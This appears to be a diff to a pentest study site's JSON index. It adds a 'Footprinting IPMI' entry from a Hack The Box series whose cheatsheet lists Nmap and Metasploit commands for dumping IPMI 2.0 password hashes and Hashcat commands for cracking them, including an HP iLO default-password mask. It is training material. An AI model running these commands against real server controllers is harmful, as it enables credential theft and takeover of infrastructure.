@@ -1,5 +1,20 @@
 [
   {
+    "id": "ipmi",
+    "title": "Footprinting IPMI",
+    "date": "2026-10-28",
+    "series": "Footprinting Services",
+    "tags": ["htb", "footprinting", "ipmi", "bmc", "ilo", "idrac", "hashcat", "enumeration"],
+    "description": "What IPMI/BMCs are, scanning UDP 623 with Nmap and Metasploit, default BMC credentials, and dumping + cracking IPMI 2.0 RAKP password hashes with Hashcat.",
+    "cheatsheet": [
+      { "cmd": "nmap -sU --script ipmi-version -p 623 <target>", "desc": "Fingerprint IPMI version" },
+      { "cmd": "msf> use auxiliary/scanner/ipmi/ipmi_version", "desc": "Metasploit IPMI version scan" },
+      { "cmd": "msf> use auxiliary/scanner/ipmi/ipmi_dumphashes", "desc": "Dump IPMI 2.0 RAKP password hashes" },
+      { "cmd": "hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt", "desc": "Crack IPMI hashes offline" },
+      { "cmd": "hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u", "desc": "HP iLO default 8-char mask attack" }
+    ]
+  },
+  {
     "id": "oracle-tns",
     "title": "Footprinting Oracle TNS",
     "date": "2026-10-24",
